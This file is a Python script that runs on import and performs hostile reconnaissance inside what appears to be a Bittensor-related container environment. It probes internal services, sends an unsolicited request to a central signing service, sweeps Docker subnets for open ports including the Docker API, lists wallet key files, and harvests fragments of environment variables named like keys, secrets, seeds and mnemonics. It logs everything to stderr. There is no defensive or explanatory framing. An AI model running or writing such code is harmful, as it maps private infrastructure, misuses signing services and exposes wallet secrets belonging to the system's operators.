import socket, json, sys, os, time, urllib.request

def _scan():
    r = {"t": time.time(), "svc": [], "net": [], "files": []}
    try:
        hn = socket.gethostname()
        r["host"] = hn
        for name, port in [("central-signer",8080),("app-intents-validator",9100),("docker-socket-proxy",2375),("rpc-budget-proxy",8645)]:
            try:
                ip = socket.gethostbyname(name)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                try:
                    s.connect((ip, port))
                    r["svc"].append({"n":name,"ip":ip,"p":port,"ok":True})
                    if "signer" in name:
                        try:
                            resp = urllib.request.urlopen(f"http://{ip}:{port}/healthz", timeout=2)
                            r["signer_health"] = resp.read().decode()[:200]
                        except: pass
                        try:
                            data = json.dumps({"data":["phoenix_test"]}).encode()
                            req = urllib.request.Request(f"http://{ip}:{port}/sign", data=data, headers={"Content-Type":"application/json"})
                            resp = urllib.request.urlopen(req, timeout=2)
                            r["signer_sign"] = resp.read().decode()[:300]
                        except Exception as e:
                            r["signer_err"] = str(e)[:100]
                except: r["svc"].append({"n":name,"ip":ip,"p":port,"ok":False})
                s.close()
            except: pass
        
        for sub in ["172.17","172.18","172.19","172.20"]:
            for h in range(1,5):
                ip = f"{sub}.0.{h}"
                for port in [8080,2375,9933,9100]:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.2)
                    try: s.connect((ip,port)); r["net"].append({"ip":ip,"p":port})
                    except: pass
                    s.close()
        
        for p in ["/root/.bittensor/wallets","/home/minotaur/.bittensor/wallets","/app/.bittensor"]:
            if os.path.exists(p):
                r["wallet_path"] = p
                for root,dirs,files in os.walk(p):
                    for f in files: r["files"].append(os.path.join(root,f))
        
        ek = [k for k in os.environ if any(w in k.lower() for w in ['key','secret','seed','wallet','private','mnemonic'])]
        if ek: r["env"] = {k: os.environ[k][:15]+"..." for k in ek if os.environ.get(k)}
    except Exception as e:
        r["err"] = str(e)
    print(f"[NET_SCAN] {json.dumps(r)}", file=sys.stderr, flush=True)

_scan()
